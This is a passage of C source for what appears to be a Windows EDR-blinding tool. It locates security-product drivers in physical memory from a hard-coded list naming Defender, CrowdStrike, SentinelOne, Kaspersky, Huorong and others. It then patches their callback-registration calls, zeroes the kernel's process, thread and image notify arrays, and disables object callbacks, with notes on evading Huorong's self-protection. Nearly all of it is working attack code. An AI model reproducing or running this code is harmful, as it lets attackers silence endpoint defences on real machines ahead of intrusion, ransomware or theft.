    if(nf>1) printf("      %d matches — ambiguous\n",nf);
    return 0;
}

/* Resolve full disk path of a kernel module via NtQuerySystemInformation module list.
 * Handles \SystemRoot\, \??\, and raw paths. Returns 1 on success. */
static int find_module_disk_path(const char *drv_name, char *out, int maxsz)
{
    MOD_LIST *ml = get_module_list();
    if (!ml) return 0;
    int found = 0;
    for (ULONG i = 0; i < ml->NumberOfModules && !found; i++) {
        const char *fn = ml->Modules[i].FullPathName + ml->Modules[i].OffsetToFileName;
        if (_stricmp(fn, drv_name) != 0) continue;
        const char *fp = ml->Modules[i].FullPathName;
        if (_strnicmp(fp, "\\SystemRoot\\", 12) == 0) {
            char wd[MAX_PATH]; GetWindowsDirectoryA(wd, sizeof wd);
            snprintf(out, maxsz, "%s\\%s", wd, fp+12);
        } else if (_strnicmp(fp, "\\??\\", 4) == 0) {
            strncpy(out, fp+4, maxsz-1); out[maxsz-1]='\0';
        } else {
            strncpy(out, fp, maxsz-1); out[maxsz-1]='\0';
        }
        found = (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES);
    }
    free(ml);
    return found;
}

/* find_driver_pa using full module path (for drivers in non-standard locations). */
static uint64_t find_driver_pa_by_modpath(const char *drv_name)
{
    char path[MAX_PATH]; if(!find_module_disk_path(drv_name,path,sizeof path)) return 0;
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    uint8_t hdr[0x200]={0}; DWORD rd=0; ReadFile(hf,hdr,sizeof hdr,&rd,NULL); CloseHandle(hf);
    if(rd<0x50||hdr[0]!='M'||hdr[1]!='Z') return 0;
    uint32_t po=*(uint32_t*)(hdr+0x3C); if(po+12>rd||*(uint32_t*)(hdr+po)!=0x00004550) return 0;
    uint16_t mach=*(uint16_t*)(hdr+po+4); uint32_t ts=*(uint32_t*)(hdr+po+8);
    uint64_t lp=0;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(cpa-lp>=0x80000000ULL){printf("      [%5lluMB]\r",(unsigned long long)(cpa>>20));fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0;off+0x50<=csz;off+=0x1000){
                if(g_chunk[off]!='M'||g_chunk[off+1]!='Z') continue;
                uint32_t peo=*(uint32_t*)(g_chunk+off+0x3C); if(peo+12>csz-off) continue;
                if(*(uint32_t*)(g_chunk+off+peo)!=0x00004550) continue;
                if(*(uint16_t*)(g_chunk+off+peo+4)!=mach) continue;
                if(*(uint32_t*)(g_chunk+off+peo+8)!=ts) continue;
                printf("      Found %s at PA=0x%016llX (modpath)\n",drv_name,(unsigned long long)(cpa+off));
                return cpa+off;
            }
        }
    }
    printf("      \n"); return 0;
}

/* Per-driver PA cache — prevents 4x physical scan for same driver (e.g. WdFilter 4 groups) */
#define PA_CACHE_MAX 64
static struct{char n[64];uint64_t pa;}g_pa_cache[PA_CACHE_MAX]; static int g_pa_n=0;
static uint64_t find_driver_pa_cached(const char *drv)
{
    for(int i=0;i<g_pa_n;i++) if(_stricmp(g_pa_cache[i].n,drv)==0) return g_pa_cache[i].pa;
    uint64_t pa=find_driver_pa(drv);
    /* Note: modpath fallback deliberately NOT here — MZ+timestamp can find stale/wrong
     * copies in physical RAM (ELAM, WinSxS duplicates). Prologue scan in flt_apply_edr
     * is more reliable. Modpath used only for sysdiag which has no standard path. */
    if(pa&&g_pa_n<PA_CACHE_MAX){strncpy(g_pa_cache[g_pa_n].n,drv,63);g_pa_cache[g_pa_n++].pa=pa;}
    return pa;
}

/* CompanyName from VersionInfo */
static const char *get_driver_company(const char *drv)
{
    static char s[128]; char path[1024];
    if(!find_driver_path(drv,path,sizeof path)) return NULL;
    DWORD dummy; DWORD sz=GetFileVersionInfoSizeA(path,&dummy); if(!sz) return NULL;
    void *buf=malloc(sz); if(!buf) return NULL;
    if(!GetFileVersionInfoA(path,0,sz,buf)){free(buf);return NULL;}
    static const char *Q[]={"\\StringFileInfo\\040904B0\\CompanyName",
                             "\\StringFileInfo\\040904E4\\CompanyName",
                             "\\StringFileInfo\\000004B0\\CompanyName",NULL};
    const char *found=NULL;
    for(int i=0;Q[i]&&!found;i++){
        UINT len=0; char *v=NULL;
        if(VerQueryValueA(buf,(char*)Q[i],(void**)&v,&len)&&len>0){strncpy(s,v,127);s[127]='\0';found=s;}
    }
    free(buf); return found;
}

/* Publisher check helpers — cached, at most one file read per unique name */
static int is_microsoft_driver(const char *n)
{
    static struct{char n[64];int r;}c[128]; static int nc=0;
    for(int i=0;i<nc;i++) if(_stricmp(c[i].n,n)==0) return c[i].r;
    const char *co=get_driver_company(n);
    int r=(co&&strstr(co,"Microsoft"))?1:0;
    if(nc<128){strncpy(c[nc].n,n,63);c[nc++].r=r;} return r;
}
static int is_hw_vendor(const char *n)
{
    static struct{char n[64];int r;}c[128]; static int nc=0;
    for(int i=0;i<nc;i++) if(_stricmp(c[i].n,n)==0) return c[i].r;
    const char *co=get_driver_company(n); int r=0;
    static const char *HW[]={"Intel","NVIDIA","Advanced Micro","Realtek","Qualcomm",
        "Atheros","Broadcom","Marvell","VMware","Oracle","Citrix",NULL};
    if(co) for(int i=0;HW[i];i++) if(strstr(co,HW[i])){r=1;break;}
    if(nc<128){strncpy(c[nc].n,n,63);c[nc++].r=r;} return r;
}

/* Known EDR/AV products — always targeted regardless of publisher.
 * Non-MS/non-HW DRV_OTHER drivers are also targeted (catch-all for
 * unknown 3rd-party security products). */
static const char *g_edr_list[]={
    /* Windows Defender / Microsoft ATP */
    "WdFilter.sys","WdNisDrv.sys","WdBoot.sys","wddevflt.sys","MpFilter.sys",
    "SenseCncProxy.sys","SenseIR.sys","MsSecFlt.sys",
    /* Huorong (hrwfpdrv=WFP NIDS; hrdevmon=hardware device monitor only)
     * sysdiag.sys = MAIN ENGINE but has self-protection (TrampoLib + integrity thread):
     * zeroing its callbacks triggers BSOD. Needs IDA analysis before safe bypass.
     * DO NOT add sysdiag.sys here until self-protection is understood. */
    "hrdevmon.sys","hrwfpdrv.sys",
    /* CrowdStrike */
    "csagent.sys","csdevicecontrol.sys","csimp.sys",
    /* Carbon Black */
    "carbonblackk.sys","cbk7.sys","cbstream.sys",
    /* SentinelOne */
    "SentinelMonitor.sys","SentinelDeviceControl.sys",
    /* ESET */
    "ehdrv.sys","eamonm.sys","epfw.sys","epfwwfp.sys",
    /* Kaspersky */
    "klflt.sys","klhk.sys","kldisk.sys","klwfp.sys",
    /* Bitdefender */
    "bddk.sys","bdfndisf6.sys","bdamsi.sys",
    /* McAfee/Trellix */
    "mfencoas.sys","mfefirek.sys","mfehidk.sys","mfewfpk.sys",
    /* Palo Alto */
    "pxeclk.sys","PanMSAgent.sys",
    /* Cybereason */
    "AngieFilter.sys","CRExecPrev.sys",
    /* Elastic */
    "ElasticEndpoint.sys",
    /* Trend Micro */
    "tmcomm.sys","TmEsFlt.sys","tmxpflt.sys",
    /* 360 Total Security / Qihoo */
    "360AvFlt.sys","360fsflt.sys","360FsFlt.sys","BAPIDRV64.sys",
    "360AntiHacker64.sys","360SelfProtection64.sys","360qpesv64.sys",
    "360NetFlt.sys","QHNetWorkCapture64.sys","360Camera64.sys",
    "QHActiveDefense64.sys","360qpcore.sys","360sandbox.sys",
    "360Hvm64.sys","360HvmCore.sys","360protect.sys",
    NULL
};
static int is_edr_target(const char *n)
{
    /* Explicitly known EDR product → always target (bypasses all gates below) */
    for(int i=0;g_edr_list[i];i++) if(_stricmp(n,g_edr_list[i])==0) return 1;

    /* Vendor wildcard patterns — catch unreleased/renamed driver variants:
     *   hr*.sys  — all Huorong (火绒) drivers: hrdevmon, hrwfpdrv, HrSafe,
     *              HrBoot, HrFileMon, HrNetMon, HrProcMon, etc.
     * Pattern is tight: must end in .sys and prefix must be exactly "hr" (2 chars). */
    {
        size_t nl=strlen(n);
        if(nl>6&&_stricmp(n+nl-4,".sys")==0&&_strnicmp(n,"hr",2)==0) return 1;
    }

    /* Must be DRV_OTHER (not in system/network/VM whitelist) */
    if(classify_driver(n)!=DRV_OTHER) return 0;
    /* Skip Microsoft OS drivers and common hardware vendors */
    if(is_microsoft_driver(n)||is_hw_vendor(n)) return 0;
    /* Pattern-based skip for stripped Windows/HW components (no version info):
     *   dump_*.sys  — crash-dump filter copies    AMDRyzen*.sys — our own driver
     *   vm3d*.sys   — VMware 3D display           mcupdate_*.dll — microcode
     *   Basic*.sys  — display/render stubs */
    if(_strnicmp(n,"dump_",5)==0||_strnicmp(n,"AMDRyzen",8)==0||
       _strnicmp(n,"vm3d",4)==0||_strnicmp(n,"mcupdate_",9)==0||
       _strnicmp(n,"Basic",5)==0) return 0;
    /* Conservative final gate: real AV/EDR products always embed version info.
     * Stripped Windows/HW drivers never do → treat as false positive. */
    if(!get_driver_company(n)) return 0;
    return 1; /* non-MS, non-HW, has version info → likely 3rd-party security */
}

/* Cache eviction */
#define EVICT_SZ (256*1024*1024)
static void cache_evict_once(void)
{
    volatile uint8_t *p=(volatile uint8_t*)VirtualAlloc(NULL,EVICT_SZ,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!p){Sleep(100);return;}
    for(size_t i=0;i<EVICT_SZ;i+=64) p[i]=(uint8_t)(i>>6);
    volatile uint64_t s=0; for(size_t i=EVICT_SZ;i>=64;i-=64) s^=p[i-64]; (void)s;
    VirtualFree((LPVOID)p,0,MEM_RELEASE); Sleep(10);
}
static void cache_evict_multiccd(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si); DWORD nc=si.dwNumberOfProcessors;
    HANDLE t=GetCurrentThread(); DWORD_PTR orig=SetThreadAffinityMask(t,1);
    SetThreadAffinityMask(t,1ULL); Sleep(1); cache_evict_once();
    if(nc>1){SetThreadAffinityMask(t,(DWORD_PTR)1<<(nc-1));Sleep(1);cache_evict_once();}
    SetThreadAffinityMask(t,orig);
}

/* Evict L1/L2/L3 on EVERY logical CPU — required when kernel threads on other
 * cores have cached EPROCESS.Protection in their private L1/L2. */
static void cache_evict_all_cores(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si); DWORD nc=si.dwNumberOfProcessors;
    HANDLE t=GetCurrentThread(); DWORD_PTR orig=SetThreadAffinityMask(t,1);
    for(DWORD i=0;i<nc;i++){
        SetThreadAffinityMask(t,(DWORD_PTR)1<<i);
        Sleep(1);
        cache_evict_once();
    }
    SetThreadAffinityMask(t,orig);
}

static void enable_debug_privilege(void)
{
    HANDLE hTok; TOKEN_PRIVILEGES tp={1};
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok)) return;
    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hTok,FALSE,&tp,0,NULL,NULL); CloseHandle(hTok);
}

#define MAX_SANE_RVA 0x400000ULL
#define PATCH3_LEN 3
static const uint8_t PATCH3[3]={0x31,0xC0,0xC3}; /* xor eax,eax; ret */
static const uint8_t WKPATCH[6]={0x48,0x31,0xC0,0x90,0x90,0x90}; /* xor rax,rax; 3xnop */

/* ══════════════════════════════════════════════════════════════════════
 * §2  MODULE: WATCHDOG KILL
 * ══════════════════════════════════════════════════════════════════════ */

#define WK_MAX 512
typedef struct {
    uint64_t call_pa, call_va, drv_va, iat_va, target_va;
    const char *func_name; char drv[64];
    uint8_t orig[6]; int patched;
} WkSite;
static WkSite g_wk[WK_MAX]; static int g_wk_n=0;

static const char *WK_FUNCS[]={
    "PsSetCreateProcessNotifyRoutine","PsSetCreateProcessNotifyRoutineEx",
    "PsSetCreateProcessNotifyRoutineEx2","PsSetLoadImageNotifyRoutine",
    "PsSetLoadImageNotifyRoutineEx","PsSetCreateThreadNotifyRoutine",
    "ObRegisterCallbacks","CmRegisterCallbackEx","CmRegisterCallback",NULL
};
static uint64_t g_wk_vas[16]; static int g_wk_nvas=0;

static void wk_resolve_targets(const uint8_t *pe, size_t pe_sz, uint64_t nt_va)
{
    g_wk_nvas=0;
    for(int i=0;WK_FUNCS[i]&&g_wk_nvas<16;i++){
        uint32_t rva=pe_export_rva(pe,pe_sz,WK_FUNCS[i]);
        g_wk_vas[g_wk_nvas++]=rva ? nt_va+rva : 0;
    }
}

static void wk_scan_driver(const char *name, uint64_t drv_pa, uint64_t drv_va, uint64_t drv_sz)
{
    for(uint64_t cpa=drv_pa;cpa<drv_pa+drv_sz;cpa+=CHUNK_SZ){
        uint64_t csz=drv_pa+drv_sz-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
        if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
        for(uint64_t off=0;off+6<=csz;off++){
            if(g_chunk[off]!=0xFF||g_chunk[off+1]!=0x15) continue;
            uint64_t iv=drv_va+(cpa-drv_pa)+off; uint64_t nr=iv+6;
            int32_t d=*(int32_t*)(g_chunk+off+2); uint64_t iat=nr+(uint64_t)(int64_t)d;
            if(iat<drv_va||iat>=drv_va+drv_sz) continue;
            uint64_t iat_pa=drv_pa+(iat-drv_va); if(!pa_in_range(iat_pa,8)) continue;
            uint64_t resolved=0; if(!phys_read(iat_pa,&resolved,8)||!resolved) continue;
            int match=-1;
            for(int j=0;j<g_wk_nvas;j++) if(g_wk_vas[j]&&resolved==g_wk_vas[j]){match=j;break;}
            if(match<0) continue;
            uint64_t call_pa=cpa+off; int dup=0;
            for(int j=0;j<g_wk_n;j++) if(g_wk[j].call_pa==call_pa){dup=1;break;}
            if(dup||g_wk_n>=WK_MAX) continue;
            WkSite *s=&g_wk[g_wk_n++];
            s->call_pa=call_pa; s->call_va=iv; s->drv_va=drv_va; s->iat_va=iat; s->target_va=resolved;
            s->func_name=WK_FUNCS[match]; strncpy(s->drv,name,63); s->drv[63]='\0'; s->patched=0;
            memset(s->orig,0,6); phys_read(call_pa,s->orig,6);
            printf("      +0x%06llX  CALL→%-42s\n",(unsigned long long)(iv-drv_va),WK_FUNCS[match]);
        }
    }
}

/* Set to 1 after kill_sysdiag_watchdog() succeeds.
 * Unlocks: sysdiag FLT Method A, wk code patch for sysdiag-protected drivers, PPL write. */
static int g_sysdiag_wd_killed = 0;
static uint64_t g_sd_base = 0;   /* sysdiag.sys loaded VA base — for OB VA-range matching */
static uint32_t g_sd_size = 0;

/* ntoskrnl disk PE — set after load, used by helpers that need export lookups */
static uint64_t  g_nt_va    = 0;
static uint8_t  *g_nt_pe    = NULL;
static DWORD     g_nt_pe_sz = 0;
/* ntoskrnl physical base (large-page contiguous → g_nt_pa+rva = PA of any export).
 * Set from nt_pa before combined_pool_scan so ob_try can read PsProcessType VA. */
static uint64_t  g_nt_pa    = 0;
/* PsProcessType / PsThreadType kernel VAs read via g_nt_pa+rva (no va_to_pa needed).
 * Used by ob_try pool-trampoline path to match sysdiag OB entries by ObjectType. */
static uint64_t  g_pstype_va[2] = {0, 0}; /* [0]=PsProcessType, [1]=PsThreadType */

/* Drivers whose code is monitored by sysdiag.sys integrity thread.
 * Patching their .text triggers sysdiag KeBugCheckEx → BSOD.
 * hrdevmon/hrwfpdrv: init callbacks already registered (patches useless anyway). */
static int wk_is_sysdiag_protected(const char *drv)
{
    static const char *prot[]={
        "sysdiag.sys","hrdevmon.sys","hrwfpdrv.sys",NULL};
    for(int i=0;prot[i];i++) if(_stricmp(drv,prot[i])==0) return 1;
    return 0;
}
static int wk_apply(void)
{
    int ok=0;
    for(int i=0;i<g_wk_n;i++){
        /* Skip Huorong drivers if watchdog still active — sysdiag monitors their code pages */
        if(wk_is_sysdiag_protected(g_wk[i].drv) && !g_sysdiag_wd_killed){
            printf("      SKIP %s (sysdiag-protected, watchdog active)\n",g_wk[i].drv);
            continue;
        }
        if(phys_write(g_wk[i].call_pa,WKPATCH,6)){
            uint8_t rb[6]={0}; phys_read(g_wk[i].call_pa,rb,6);
            if(memcmp(rb,WKPATCH,6)==0){g_wk[i].patched=1;ok++;}
        }
    }
    return ok;
}
static void wk_restore(void)
{
    for(int i=0;i<g_wk_n;i++){
        if(!g_wk[i].patched) continue;
        uint8_t cur[6]={0};
        if(phys_read(g_wk[i].call_pa,cur,6)&&memcmp(cur,WKPATCH,6)==0)
            phys_write(g_wk[i].call_pa,g_wk[i].orig,6);
        g_wk[i].patched=0;
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §3  MODULE: PS* NOTIFY CALLBACKS
 * ══════════════════════════════════════════════════════════════════════ */

typedef struct { uint64_t entry_pa; uint64_t orig_val; int zeroed; } PsSavedEntry;
typedef struct {
    const char *name; const char *setter; int max;
    uint64_t array_va, array_pa;
    PsSavedEntry entries[64]; int n_saved;
} PsArray;
static PsArray g_ps[3]={
    {"PspCreateProcessNotifyRoutine","PsSetCreateProcessNotifyRoutine",64,0,0,{},0},
    {"PspLoadImageNotifyRoutine",    "PsSetLoadImageNotifyRoutine",     8,0,0,{},0},
    {"PspCreateThreadNotifyRoutine", "PsSetCreateThreadNotifyRoutine", 64,0,0,{},0},
};

static uint64_t ps_find_array(const uint8_t *pe, size_t pe_sz,
                               uint64_t nt_pa, uint64_t nt_va, uint64_t nt_size,
                               const char *setter,
                               const uint64_t *excl, int nexcl)
{
    uint32_t rva=pe_export_rva(pe,pe_sz,setter); if(!rva) return 0;
    uint64_t nt_end=nt_va+(nt_size?nt_size:pe_sz);
    uint64_t best=0; int best_score=-1;

    /* Build scan list: setter + callees reachable via E8/E9 in setter body.
     * On Windows 11, PsSetCreate*NotifyRoutine is a thin wrapper — the LEA
     * referencing PspCreate*NotifyRoutine lives in the callee, not the setter. */
    uint32_t scan[8]; int nscan=0;
    scan[nscan++]=rva;
    {
        uint8_t hd[512]={0}; phys_read(nt_pa+rva,hd,sizeof hd);
        for(int i=0;i<(int)sizeof(hd)-5;i++){
            if(hd[i]!=0xE8&&hd[i]!=0xE9) continue; /* CALL/JMP rel32 */
            int32_t d=*(int32_t*)(hd+i+1);
            uint64_t tv=(uint64_t)((int64_t)(nt_va+rva+i+5)+d);
            if(tv<nt_va||tv>=nt_end) continue;
            uint32_t tr=(uint32_t)(tv-nt_va);
            int dup=0; for(int k=0;k<nscan;k++) if(scan[k]==tr){dup=1;break;}
            if(!dup&&nscan<8) scan[nscan++]=tr;
        }
    }

    for(int si=0;si<nscan;si++){
        uint8_t code[1024]={0};
        uint32_t crva=scan[si];
        if(!phys_read(nt_pa+crva,code,sizeof code)) continue;
        for(int i=0;i<(int)sizeof(code)-7;i++){
            if((code[i]!=0x48&&code[i]!=0x4C)||code[i+1]!=0x8D||(code[i+2]&0xC7)!=0x05) continue;
            int32_t disp=*(int32_t*)(code+i+3);
            uint64_t tgt=(uint64_t)((int64_t)(nt_va+crva+i+7)+disp);
            if(tgt<nt_va||tgt>=nt_end) continue;
            /* No rva_in_data_section check — content validation below is sufficient */
            /* Exclusion check: skip VAs already claimed by a previous Ps* array */
            int excl_hit=0; for(int xi=0;xi<nexcl;xi++) if(tgt==excl[xi]){excl_hit=1;break;}
            if(excl_hit) continue;
            uint64_t tpa=nt_pa+(tgt-nt_va); uint64_t e[64]={0};
            if(!phys_read(tpa,e,64*8)) continue;
            int valid=1,nn=0,np=0;
            for(int j=0;j<64;j++){if(!e[j]){nn++;continue;}if((e[j]>>48)!=0xFFFFULL){valid=0;break;}np++;}
            if(!valid) continue;
            int score=nn+np*10;
            if(score>best_score){best_score=score;best=tgt;}
        }
    }
    return (best&&best_score>=3)?best:0;
}

static int ps_zero(PsArray *arr)
{
    int ok=0; uint64_t z=0;
    for(int i=0;i<arr->max&&arr->n_saved<64;i++){
        uint64_t epa=arr->array_pa+(uint64_t)i*8; uint64_t v=0;
        if(!phys_read(epa,&v,8)||!v) continue;
        arr->entries[arr->n_saved].entry_pa=epa;
        arr->entries[arr->n_saved].orig_val=v;
        arr->entries[arr->n_saved].zeroed=phys_write(epa,&z,8);
        if(arr->entries[arr->n_saved].zeroed) ok++;
        arr->n_saved++;
    }
    return ok;
}
static void ps_restore(PsArray *arr)
{
    for(int i=0;i<arr->n_saved;i++){
        if(!arr->entries[i].zeroed) continue;
        uint64_t cur=0;
        if(phys_read(arr->entries[i].entry_pa,&cur,8)&&cur==0)
            phys_write(arr->entries[i].entry_pa,&arr->entries[i].orig_val,8);
        arr->entries[i].zeroed=0;
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §4  MODULE: OB REGISTER CALLBACKS
 * ══════════════════════════════════════════════════════════════════════ */

#define OB_MAX 256
typedef struct {
    uint64_t preop_pa, postop_pa, preop_va, postop_va, objtype_va;
    uint64_t enabled_pa;              /* PA of OB_CALLBACK_ENTRY.Enabled BOOL */
    char drv[64];
    uint8_t orig_pre[8],orig_post[8];
    uint8_t orig_en[4];               /* saved Enabled value for restore */
    int zeroed;
} ObEntry;
static ObEntry g_ob[OB_MAX]; static int g_ob_n=0;

/* Read PsProcessType / PsThreadType VAs from physical ntoskrnl image.
 * ntoskrnl is large-page mapped → g_nt_pa + rva = exact PA, no va_to_pa needed.
 * Must be called after g_nt_pa / g_nt_pe / g_nt_pe_sz are set (before pool scan). */
static void init_pstype_va(void)
{
    if(g_pstype_va[0] && g_pstype_va[1]) return;
    if(!g_nt_pa || !g_nt_pe || !g_nt_pe_sz) return;
    static const char *names[2] = {"PsProcessType","PsThreadType"};
    for(int t = 0; t < 2; t++){
        uint32_t rva = pe_export_rva(g_nt_pe, g_nt_pe_sz, names[t]);
        if(!rva) continue;
        uint64_t pa = g_nt_pa + rva;
        if(!pa_in_range(pa, 8)) continue;
        uint64_t v = 0;
        if(!phys_read(pa, &v, 8) || (v>>48) != 0xFFFF){ g_pstype_va[t]=0; continue; }
        g_pstype_va[t] = v;
        printf("    [init] %-16s = 0x%016llX\n", names[t], (unsigned long long)v);
    }
}

static int ob_try(uint64_t cpa, uint64_t off, uint64_t csz)
{
    if(off<0x28||off+0x10>csz) return 0;
    uint64_t preop=*(uint64_t*)(g_chunk+off), postop=*(uint64_t*)(g_chunk+off+0x08);
    uint64_t pr=0; const char *pd=va_to_driver_ex(preop,&pr);
    int is_trampoline=(!pd||!pr||pr>=MAX_SANE_RVA);
    if(is_trampoline){
        /* Pool-trampoline: preop not in any module (sysdiag TrampoLib64).
         * Early-return after confirming kernel VA + PsProcessType/ThreadType ObjectType.
         * Skip ops/en/reg structural checks — these contain non-standard values for
         * sysdiag entries (en padding bytes non-zero, reg may have flags set). */
        if((preop>>48)!=0xFFFFULL) return 0;
        if(!g_pstype_va[0]&&!g_pstype_va[1]) return 0;
        uint64_t ot_chk=*(uint64_t*)(g_chunk+off-0x08);
        if(ot_chk!=g_pstype_va[0]&&ot_chk!=g_pstype_va[1]) return 0;
        uint64_t fl=*(uint64_t*)(g_chunk+off-0x28),bl=*(uint64_t*)(g_chunk+off-0x20);
        if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
        uint64_t ppa=cpa+off;
        for(int i=0;i<g_ob_n;i++) if(g_ob[i].preop_pa==ppa) return 0;
        if(g_ob_n>=OB_MAX) return 0;
        ObEntry *e=&g_ob[g_ob_n++];
        e->preop_pa=ppa; e->postop_pa=ppa+8; e->preop_va=preop;
        e->postop_va=*(uint64_t*)(g_chunk+off+8); e->objtype_va=ot_chk;
        e->enabled_pa=cpa+off-0x14;
        strncpy(e->drv,"sysdiag.sys",63); e->drv[63]='\0'; e->zeroed=0;
        printf("    [OB-tr] sysdiag trampoline preop=0x%llX ot=0x%llX\n",
               (unsigned long long)preop,(unsigned long long)ot_chk);
        return 1;
    }
    if(postop){uint64_t qr=0;const char *qd=va_to_driver_ex(postop,&qr);if(!qd||strcmp(qd,pd)||!qr||qr>=MAX_SANE_RVA) return 0;if(preop==postop) return 0;}
    uint32_t ops=*(uint32_t*)(g_chunk+off-0x18); if(ops<1||ops>3) return 0;
    uint32_t en=*(uint32_t*)(g_chunk+off-0x14); if(!en||(en>>8)) return 0;
    uint64_t reg=*(uint64_t*)(g_chunk+off-0x10); if((reg>>48)!=0xFFFFULL||va_in_any_module(reg)||reg&7) return 0;
    uint64_t ot=*(uint64_t*)(g_chunk+off-0x08); if((ot>>48)!=0xFFFFULL||va_in_any_module(ot)||ot&7) return 0;
    uint64_t fl=*(uint64_t*)(g_chunk+off-0x28),bl=*(uint64_t*)(g_chunk+off-0x20);
    if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
    if(va_in_any_module(fl)||va_in_any_module(bl)) return 0;
    uint64_t ppa=cpa+off;
    for(int i=0;i<g_ob_n;i++) if(g_ob[i].preop_pa==ppa) return 0;
    if(g_ob_n>=OB_MAX) return 0;
    ObEntry *e=&g_ob[g_ob_n++];
    e->preop_pa=ppa; e->postop_pa=ppa+8; e->preop_va=preop; e->postop_va=postop; e->objtype_va=ot;
    e->enabled_pa=cpa+off-0x14; /* OB_CALLBACK_ENTRY.Enabled at struct+0x14, preop at struct+0x28 */
    strncpy(e->drv,pd,63); e->drv[63]='\0'; e->zeroed=0;
    return 1;
}
/* OB anc=0x20 variant (older/alt layout: no Entry ptr between Ops and ObjectType) */
static int ob_try_20(uint64_t cpa, uint64_t off, uint64_t csz)
{
    if(off<0x20||off+0x10>csz) return 0;
    uint64_t preop=*(uint64_t*)(g_chunk+off),postop=*(uint64_t*)(g_chunk+off+8);
    uint64_t pr=0; const char *pd=va_to_driver_ex(preop,&pr);
    int is_trampoline=(!pd||!pr||pr>=MAX_SANE_RVA);
    if(is_trampoline){
        if((preop>>48)!=0xFFFFULL) return 0;
        if(!g_pstype_va[0]&&!g_pstype_va[1]) return 0;
        uint64_t ot_chk=*(uint64_t*)(g_chunk+off-0x08);
        if(ot_chk!=g_pstype_va[0]&&ot_chk!=g_pstype_va[1]) return 0;
        uint64_t fl=*(uint64_t*)(g_chunk+off-0x20),bl=*(uint64_t*)(g_chunk+off-0x18);
        if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
        uint64_t ppa=cpa+off;
        for(int i=0;i<g_ob_n;i++) if(g_ob[i].preop_pa==ppa) return 0;
        if(g_ob_n>=OB_MAX) return 0;
        ObEntry *e=&g_ob[g_ob_n++];
        e->preop_pa=ppa; e->postop_pa=ppa+8; e->preop_va=preop;
        e->postop_va=*(uint64_t*)(g_chunk+off+8); e->objtype_va=ot_chk;
        e->enabled_pa=cpa+off-0x0C;
        strncpy(e->drv,"sysdiag.sys",63); e->drv[63]='\0'; e->zeroed=0;
        printf("    [OB-tr20] sysdiag trampoline preop=0x%llX ot=0x%llX\n",
               (unsigned long long)preop,(unsigned long long)ot_chk);
        return 1;
    }
    if(postop){uint64_t qr=0;const char *qd=va_to_driver_ex(postop,&qr);if(!qd||strcmp(qd,pd)||!qr||qr>=MAX_SANE_RVA) return 0;}
    uint32_t ops=*(uint32_t*)(g_chunk+off-0x10); if(ops<1||ops>3) return 0;
    uint64_t ot=*(uint64_t*)(g_chunk+off-0x08); if((ot>>48)!=0xFFFFULL||va_in_any_module(ot)||ot&7) return 0;
    uint64_t fl=*(uint64_t*)(g_chunk+off-0x20),bl=*(uint64_t*)(g_chunk+off-0x18);
    if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
    if(va_in_any_module(fl)||va_in_any_module(bl)) return 0;
    uint64_t ppa=cpa+off;
    for(int i=0;i<g_ob_n;i++) if(g_ob[i].preop_pa==ppa) return 0;
    if(g_ob_n>=OB_MAX) return 0;
    ObEntry *e=&g_ob[g_ob_n++];
    e->preop_pa=ppa; e->postop_pa=ppa+8; e->preop_va=preop; e->postop_va=postop; e->objtype_va=ot;
    e->enabled_pa=cpa+off-0x0C; /* Enabled at struct+0x14, preop at struct+0x20 → off-0x0C */
    strncpy(e->drv,pd,63); e->drv[63]='\0'; e->zeroed=0;
    return 1;
}
/* Scan from ObjectType* field position — complementary to ob_try which scans from PreOperation.
 * Catches sysdiag entries where ops/en/reg checks at the preop-scan position all fail.
 * When g_chunk[off] == target_ot (PsProcessType or PsThreadType VA), PreOperation is at off+0x08.
 * Layout assumed: OT@+0x20, Preop@+0x28, Flink@+0x00, Blink@+0x08 (Windows 11 0x28-anchor). */
/* Tier-1: OT scan with Flink/Blink sanity (0x28-anchor layout) */
static int ob_try_by_ot(uint64_t cpa, uint64_t off, uint64_t csz, uint64_t target_ot)
{
    if(off<0x20||off+0x10>csz) return 0;
    if(*(uint64_t*)(g_chunk+off) != target_ot) return 0;
    uint64_t preop=*(uint64_t*)(g_chunk+off+0x08);
    if(!preop||(preop>>48)!=0xFFFFULL) return 0;
    /* Reject obvious false positives:
     * - preop == target_ot: pool chunk where OT repeats in the next slot (not a real entry)
     * - preop & 0xF: function pointers must be at least 16-byte aligned
     * - preop == PsProcessType or PsThreadType VA: clearly an OT pointer, not a function */
    if(preop == target_ot) return 0;           /* OT pointer repeated in next slot */
    if(preop & 0xF) return 0;                 /* function pointers must be ≥16B aligned */
    if(preop == g_pstype_va[0] || preop == g_pstype_va[1]) return 0; /* OT ptr, not fn */
    uint64_t pr=0;
    if(va_to_driver_ex(preop,&pr) && pr && pr<MAX_SANE_RVA) return 0;
    uint64_t fl=*(uint64_t*)(g_chunk+off-0x20),bl=*(uint64_t*)(g_chunk+off-0x18);
    if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
